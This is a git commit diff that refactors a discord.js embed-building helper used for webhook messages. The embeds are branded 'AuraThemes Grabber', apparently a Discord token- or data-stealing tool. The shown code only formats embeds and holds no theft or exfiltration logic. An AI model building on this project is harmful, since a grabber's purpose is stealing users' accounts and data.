b02aea3bd52306b5f65c7ea5728583a409f8e78e
k4itrun <103044629+k4itrun@users.noreply.github.com>
2024-01-12 14:56:27 -0500

    yes

--- src/utils/webhook/webhook.js
+++ src/utils/webhook/webhook.js
@@ -3,26 +3,15 @@ const { EmbedBuilder } = require('discord.js');
 const getEmbeds = ({ author = {}, thumbnail, color = "", title = "", desc = "", fields = [] }) => {
     try {
         let { name = "-", icon_url = "https://i.imgur.com/WkKXZSl.gif" } = author;
-        let builder = new EmbedBuilder()
-            .setAuthor({ name: name, iconURL: icon_url })
-            .setColor(color === "" ? "#c267ff" : color)
-            if (thumbnail) {
-                builder.setThumbnail(thumbnail)
-            }
-            if (title) {
-                builder.setTitle(title)
-            } else {
-                builder.setTitle("AuraThemes Grabber")
-            }
-            if (desc) {
-                builder.setDescription(desc);
-            }
+        let b = new EmbedBuilder().setAuthor({ name: name, iconURL: icon_url }).setColor(color === "" ? "#c267ff" : color)
+            if (thumbnail) b.setThumbnail(thumbnail)
+            if (title) b.setTitle(title)
+            else b.setTitle("AuraThemes Grabber")
+            if (desc) b.setDescription(desc);
         if (fields.length > 0) {
-            builder.addFields(...fields);
+            b.addFields(...fields);
         }
-        return builder
-            .setFooter({ text: "AuraThemes Grabber - https://discord.gg/aurathemes", iconURL: "https://i.imgur.com/WkKXZSl.gif" })
-            .setTimestamp();
+        return b.setFooter({ text: "AuraThemes Grabber - https://discord.gg/aurathemes", iconURL: "https://i.imgur.com/WkKXZSl.gif" }).setTimestamp();
     } catch (e) {
         return null;
     }
